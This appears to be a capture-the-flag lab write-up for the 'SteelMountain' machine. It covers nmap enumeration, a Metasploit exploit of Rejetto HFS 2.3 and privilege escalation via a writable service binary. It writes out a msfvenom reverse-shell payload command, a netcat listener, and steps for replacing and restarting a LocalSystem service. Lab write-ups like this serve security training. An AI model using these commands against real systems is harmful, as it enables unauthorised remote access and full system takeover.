# SteelMountain


## Nmap Scan

```$ nmap -sV -v -oN Nmap/initial_scan.nmap 10.10.224.185```
```$ nmap -A -p- -v -oN Nmap/all_scan.nmap 10.10.224.185```
```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Eumeration

HTTP Server running on port 8080
"Rejetto HFS HTTP File Server 2.3"
```
$ searchsploit Rejetto HFS HTTP File Server
```

---

Exploit Title | Path

---

Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload| multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | windows/webapps/34852.txt


## Exploitation

Metasploit module: exploit/windows/http/rejetto_hfs_exec

Use module, self explanitory


## Privilege Escalation

Using PowerUp to enumerate privesc

Upload to victim: ```meterpreter > upload /usr/share/scripts/PowerUp.ps1```

Load PowerShell into meterpreter: ```meterpreter > load powershell```

Execute the script:
```
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

In the output we see a possible vuln. CanRestart is set to True, allowing us to restart the service. The service is also writable so we can replace the exe and restart it to run a shell.

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

Create a msfvenom payload: ```msfvenom -p windows/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4443 -e x86/shikata_ga_nai -f exe -o payload.exe```

Start a netcat listener: nc -lnvp 4443

Stop the service: net stop AdvancedSystemCareService9

Upload payload to server with the name "ASCService.exe" and copy it into the "C:\Program Files (x86)\IObit\Advanced SystemCare" folder.

Restart the service: net start AdvancedSystemCareService9

Shell should connect on NC listener!
